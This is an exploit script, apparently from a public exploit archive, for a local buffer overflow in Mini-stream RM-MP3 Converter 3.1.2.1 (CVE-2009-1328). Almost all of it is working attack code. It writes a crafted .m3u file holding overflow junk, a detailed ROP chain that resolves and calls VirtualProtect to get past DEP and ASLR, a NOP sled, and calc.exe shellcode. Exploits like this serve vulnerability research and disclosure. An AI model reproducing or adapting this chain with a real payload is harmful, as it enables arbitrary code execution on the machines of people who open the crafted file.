# Exploit Title: Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30 local buffer overflow (\w ASLR and DEP bypass)
# Date: 26 July 2012
# Exploit Author: Gianni Gnesa
# Vendor Homepage: http://mini-stream.net/
# Software Link: http://mini-stream.net/rm-to-mp3-converter/download
# Version: 3.1.2.1.2010.03.30
# Tested on: Windows 7 SP1 (VMware)
# References: CVE-2009-1328, BID 34494 

from struct import pack

fname = "rop.m3u"
hdr   = "http://."
junk1 = "A" * 17416     # junk

rop =   [
            0x10041720, # RETN [MSRMfilter03.dll]
            0x41414141, # Compensate


            #### Save ESP into ESI
            # EAX=EBP
            0x1001a503, # XOR EAX,EAX / RETN [MSRMfilter03.dll]
            0x10051ff5, # ADD EAX,EBP / RETN [MSRMfilter03.dll]
            
            # ESI=EAX
            0x1005bb8e, # PUSH EAX / ADD DWORD PTR SS:[EBP+5],ESI / PUSH 1 / POP EAX / POP ESI / RETN [MSRMfilter03.dll]
            
            # EBX=ESI
            0x1001217b, # PUSH ESI / ADD AL,5E / POP EBX / RETN [MSRMfilter03.dll]

            # EDX=EBX
            0x1002991c, # XOR EDX,EDX / RETN [MSRMfilter03.dll]
            0x10029f3e, # ADD EDX,EBX / POP EBX / RETN 10 [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBX
 
            # ESI=ESP
            0x10032D54, # PUSH ESP / AND AL,10 / POP ESI / MOV DWORD PTR DS:[EDX],ECX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for RETN
            0x41414141, # Junk for RETN
            0x41414141, # Junk for RETN
            0x41414141, # Junk for RETN

            
            #### Jump over VirtualProtect()
            0x100237C8, # ADD ESP, 20 / RETN [MSRMfilter03.dll]
            
            0x58585858, # VirtualProtect()
            0x58585858, # Return Address
            0x58585858, # lpAddress
            0x58585858, # dwSize
            0x58585858, # flNewProtect
            0x10085515, # lpflOldProtect  [Address in MSRMfilter03.dll]

            0x90909090, # Padding
            0x90909090, # Padding
            # ADD ESP,20 / RETN will land here


            #### Find kernel32.VirtualProtect
            # Save ESI (Saved ESP) into EBX
            0x1001217b, # PUSH ESI / ADD AL,5E / POP EBX / RETN [MSRMfilter03.dll]

            # EAX = Saved ESP - 0xACE4
            0x1002ca2d, # POP EAX / RETN [MSRMfilter03.dll]
            0xFFFF531C, # -0xACE4 (offset from the Saved ESP to the kernel32.XXXXBBE4 in the stack)
            0x10033bbb, # ADD EAX,ESI / POP ESI / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in ESI

            # Pickup kernel32.XXXXBBE4 into EAX
            0x10027f59, # MOV EAX,DWORD PTR DS:[EAX] / RETN [MSRMfilter03.dll]

            # Find kernel32.VirtualProtect
            0x1001263D, # POP ECX / RETN [MSRMfilter03.dll]
            0xFFFF675D, # -0x98A3 (offset from kernel32.XXXXBBE4 to kernel32.VirtualProtect)
            0x1001451e, # ADD EAX,ECX / RETN [MSRMfilter03.dll] 


            ##### Write VirtualProtect address to memory
            # EDX = EBX = Saved ESP
            0x1002993c, # XOR EDX,EDX / RETN [MSRMfilter03.dll]
            0x10029f3e, # ADD EDX,EBX / POP EBX / RETN 10 [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBX

            # EDX = EDX + 4
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for RETN
            0x41414141, # Junk for RETN
            0x41414141, # Junk for RETN
            0x41414141, # Junk for RETN
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            
            # Write VirtualProtect address to memory
            0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]


            #### Write return address to memory
            # EAX = EDX (Saved ESP) + 0x300
            0x1002fa6a, # MOV EAX,EDX / RETN [MSRMfilter03.dll]
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP

            # EDX = EDX + 4
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            
            # Write return address to memory
            0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]


            #### Write lpAddress parameter to memory
            # EAX = EDX (Saved ESP) + 0x300
            0x1002fa6a, # MOV EAX,EDX / RETN [MSRMfilter03.dll]
            0x1001263D, # POP ECX / RETN [MSRMfilter03.dll]
            0xFFFFFFFC, # -0x4 (compensate EDX increment)
            0x1001451e, # ADD EAX,ECX / RETN [MSRMfilter03.dll]
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP

            # EDX = EDX + 4
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            
            # Write lpAddress parameter to memory
            0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]


            #### Write dwSize parameter to memory
            # EAX = 0x400
            0x1001a503, # XOR EAX,EAX / RETN [MSRMfilter03.dll]
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll] 
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll] 
            0x41414141, # Junk popped in EBP
            0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll] 
            0x41414141, # Junk popped in EBP

            # EDX = EDX + 4
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            
            # Write dwSize parameter to memory
            0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]


            #### Write flNewProtect parameter to memory
            # EAX = 0x40
            0x1001a503, # XOR EAX,EAX / RETN [MSRMfilter03.dll]
            0x10031c81, # ADD EAX,40 # POP EBP / RETN [MSRMfilter03.dll]
            0x41414141, # Junk popped in EBP
            
            # EDX = EDX + 4
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]
            0x41414141, # Junk for ESI
            0x41414141, # Junk for EDI
            0x41414141, # Junk for EBX
            
            # Write flNewProtect parameter to memory
            0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]


            #### Call VirtualProtect
            0x1002fa6a, # MOV EAX,EDX / RETN [MSRMfilter03.dll]
            0x1001263D, # POP ECX / RETN [MSRMfilter03.dll]
            0xFFFFFFF0, # -0x10 (Move EDX back to the VirtualProtect call)
            0x1001451e, # ADD EAX,ECX / RETN [MSRMfilter03.dll]
            0x1002fe81, # XCHG EAX,ESP / RETN [MSRMfilter03.dll]
        ]

nops = "\x90" * 240

# calc.exe payload
shellcode = (
"\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52"
"\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E"
"\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C"
"\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F"
"\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7"
)


print "Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30"
print "Local buffer overflow (\w ASLR and DEP bypass)\n"

payload = hdr + junk1 + pack('<'+str(len(rop))+'L',*rop) + nops + shellcode

f = open(fname, "w")
f.write(payload)
f.close()

print "%s file created!" % fname